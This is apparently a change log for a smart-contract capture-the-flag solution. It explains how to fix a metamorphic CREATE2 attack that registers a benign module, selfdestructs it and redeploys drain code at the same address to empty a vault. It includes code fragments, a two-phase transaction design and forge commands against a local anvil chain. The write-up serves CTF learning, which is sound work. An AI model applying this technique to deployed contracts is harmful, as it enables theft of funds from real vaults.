# Sentinel Attack — Changes From Original Code

## Overview

The original attack concept was **100% correct**: metamorphic CREATE2 pattern — deploy legit EchoModule, register it, selfdestruct, redeploy malicious code at same address, drain the vault.

The issues were syntax errors, nonexistent functions, and a design problem (selfdestruct needs 2 separate transactions).

---

## 1. `EchoModule_attack.sol`

**Original:**
```solidity
contract hello{
    function attack(address vault) external {
        vault.operatorWithdraw(msg.sender, balanceOf(vault));
    }
}
```

**Changes:**
- `vault.operatorWithdraw(...)` — can't call functions on a raw `address`. Changed to `ISentinelVault(vault).operatorWithdraw(...)` (cast to interface)
- `balanceOf(vault)` — doesn't exist anywhere. Changed to `address(_vault).balance` (native Solidity way to get ETH balance)
- Added a `_recipient` parameter so the caller decides where the ETH goes

---

## 2. `echoModuleFactory.sol`

**Original:**
```solidity
contract Factory {
    EchoModule public echo;
    hello public attack;

    function deployEchoModule() public {
        echo = new EchoModule();
        return address(echo);
    }
    function distruct() external {
        selfdestruct(payable(msg.sender));
    }
    function deployAttack() public {
        attack = new hello(); 
        retrn address(attack);
    }
}
```

**Changes:**
- `retrn` — typo, changed to `return`
- `distruct` — typo, renamed to `destroy`
- Missing `returns (address)` on both deploy functions — Solidity requires the return type in the function signature
- **Design change:** merged `deployEchoModule()` and `deployAttack()` into one `deploy()` function that reads `attackPhase` from the caller. **Why?** The Factory bytecode must be identical both times for CREATE2 to produce the same address. One `deploy()` that branches on a flag ensures the child lands at the same address via CREATE (same factory address + same nonce = same child address)

---

## 3. `sentinelAttack.sol` — biggest change

**Original:**
```solidity
contract sentineAttack{
    Factory public factory;
    function Attack(address target) public {
        bytes32 salt = "help";
        bytes32 bytecode = Factory.opcode();
        factory = deploy(0, salt, bytecode);
        address module = factory.deployEchoModule();
        target.registerModule(module);
        module.decommission();
        factory.distruct();

        factory = deploy(0, salt, bytecode);
        address attack = factory.deployAttack;
        attack.attack(target);
    }
}
```

**The sequence was correct** — deploy factory → deploy module → register → selfdestruct → redeploy → attack. But:

- `Factory.opcode()` — doesn't exist. Was trying to get factory creation bytecode
- `deploy(0, salt, bytecode)` — doesn't exist. Was trying to do CREATE2 but this isn't a real function
- `target.registerModule(module)` — raw address, needs `ISentinelVault(target).registerModule(module)`
- `module.decommission()` — raw address, needs `EchoModule(module).decommission()`
- `factory.deployAttack` — missing `()` (function call, not property)
- **All in one function** — can't work because selfdestruct only takes effect at the end of a transaction. Needs two separate transactions

**Changes:** Split into `phase1()` and `phase2()`:
- Phase 1: deploy + register + selfdestruct (one tx)
- Phase 2: redeploy + drain (separate tx, after selfdestruct took effect)
- Used `new Factory{salt: SALT}()` — Solidity's actual CREATE2 syntax (replaces the `deploy()` pseudocode)
- Added `attackPhase` bool that the Factory reads to decide which child to deploy

---

## 4. `sentinel_Attack.s.sol` (forge script)

**Original:**
```solidity
contract script {
    function run() external {
        vm.startBroadcast();
        EchoModule echo = new EchoModule();
        Challenge challenge = new Challenge(address(echo));
        address vault = address(Challenge.VAULT());
        sentineAttack setinel = new sentineAttack(vault);
        bool suc = challenge.isSolved();
```

**Changes:**
- `Challenge.VAULT()` — should be `challenge.VAULT()` (instance call, not type call)
- Added `{value: 1 ether}` to Challenge deployment (vault needs ETH to drain)
- Split broadcast into two parts with `vm.etch` / `vm.setNonceUnsafe` in between to simulate selfdestruct taking effect (forge simulates everything as one tx internally)
- Calls `phase1()` then `phase2()` instead of one constructor call

---

## 5. `foundry.toml` (build fix)

- Removed `solc_version = "0.8.28"` — target contracts require `0.8.19`, Foundry auto-resolves
- Enabled `via_ir = true` — needed for `attack_score.s.sol` (different challenge) which hit stack-too-deep

---

## Commands to Run

```bash
# Terminal 1: start local blockchain
anvil --hardfork shanghai

# Terminal 2: run the attack
forge script script/sentinel_Attack.s.sol:SentinelAttackScript \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast -vvvv
```

Expected output: `Solved: true`
